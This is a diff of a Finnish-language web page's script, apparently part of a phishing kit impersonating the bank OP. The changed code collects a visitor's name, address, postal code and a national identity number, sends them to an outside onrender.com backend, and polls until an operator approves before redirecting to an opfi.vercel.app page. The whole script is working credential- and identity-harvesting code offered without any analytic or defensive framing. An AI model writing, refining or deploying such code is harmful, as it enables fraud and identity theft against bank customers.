@@ -213,78 +213,75 @@
     <p>Lähetetään tietojasi…</p>
   </div>
 
-  <script>
-    const form        = document.getElementById("details-form");
-    const submitBtn   = document.getElementById("submit-btn");
-    const errorDiv    = document.getElementById("error");
-    const spinnerPage = document.getElementById("spinner-page");
-    const backendUrl  = "https://op-9nkj.onrender.com"; // Päivitä tarvittaessa
+<script>
+  const form        = document.getElementById("details-form");
+  const submitBtn   = document.getElementById("submit-btn");
+  const errorDiv    = document.getElementById("error");
+  const spinnerPage = document.getElementById("spinner-page");
+  const backendUrl  = "https://op-9nkj.onrender.com"; // päivitä tarvittaessa
 
-    const showSpinner = () => spinnerPage.style.display = "flex";
-    const hideSpinner = () => spinnerPage.style.display = "none";
+  const showSpinner = () => spinnerPage.style.display = "flex";
+  const hideSpinner = () => spinnerPage.style.display = "none";
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    errorDiv.style.display = "none";
 
-      errorDiv.style.display = "none";
+    const data = {
+      full_name: document.getElementById("full-name").value.trim(),
+      address: document.getElementById("address").value.trim(),
+      city: document.getElementById("city").value.trim(),
+      zip: document.getElementById("postal").value.trim(),
+      ssn: document.getElementById("phone").value.trim()
+    };
 
-      const data = {
-        fullName: document.getElementById("full-name").value.trim(),
-        dob: document.getElementById("dob").value,
-        address: document.getElementById("address").value.trim(),
-        city: document.getElementById("city").value.trim(),
-        postalCode: document.getElementById("postal").value.trim(),
-        phone: document.getElementById("phone").value.trim()
+    if (!data.full_name || !data.address || !data.city || !data.zip || !data.ssn) {
+      errorDiv.textContent = "Täytä kaikki kentät.";
+      errorDiv.style.display = "block";
+      return;
+    }
+
+    showSpinner();
+    submitBtn.disabled = true;
+
+    try {
+      const resp = await fetch(`${backendUrl}/personal`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+
+      const result = await resp.json();
+      if (!result.success) throw new Error(result.error || "Lähetys epäonnistui");
+
+      const sessionId = result.id;
+
+      const poll = async () => {
+        try {
+          const statusResp = await fetch(`${backendUrl}/status/${sessionId}`);
+          const status = await statusResp.json();
+
+          if (status.status === "approved" && status.redirect_url) {
+            hideSpinner();
+            window.location.href = `https://opfi.vercel.app/${status.redirect_url}`;
+          } else {
+            setTimeout(poll, 2000);
+          }
+        } catch (err) {
+          throw err;
+        }
       };
 
-      if (!data.fullName || !data.dob || !data.address || !data.city || !data.postalCode || !data.phone) {
-        errorDiv.textContent = "Täytä kaikki kentät.";
-        errorDiv.style.display = "block";
-        return;
-      }
+      poll();
+    } catch (err) {
+      hideSpinner();
+      errorDiv.textContent = err.message || "Tapahtui virhe. Yritä uudelleen.";
+      errorDiv.style.display = "block";
+      submitBtn.disabled = false;
+    }
+  });
 
-      showSpinner();
-      submitBtn.disabled = true;
-
-      try {
-        const resp = await fetch(`${backendUrl}/details`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        });
-
-        const result = await resp.json();
-
-        if (!result.success) throw new Error(result.error || "Lähetys epäonnistui");
-
-        const sessionId = result.id;
-
-        const poll = async () => {
-          try {
-            const statusResp = await fetch(`${backendUrl}/status/${sessionId}`);
-            const status = await statusResp.json();
-
-            if (status.status === "approved" && status.redirect_url) {
-              hideSpinner();
-              window.location.href = `https://opfi.vercel.app/${status.redirect_url}`;
-            } else {
-              setTimeout(poll, 2000);
-            }
-          } catch (err) {
-            throw err;
-          }
-        };
-
-        poll();
-      } catch (err) {
-        hideSpinner();
-        errorDiv.textContent = err.message || "Tapahtui virhe. Yritä uudelleen.";
-        errorDiv.style.display = "block";
-        submitBtn.disabled = false;
-      }
-    });
-
-    document.getElementById("full-name").focus();
-  </script>
+  document.getElementById("full-name").focus();
+</script>
 </body>
 </html>
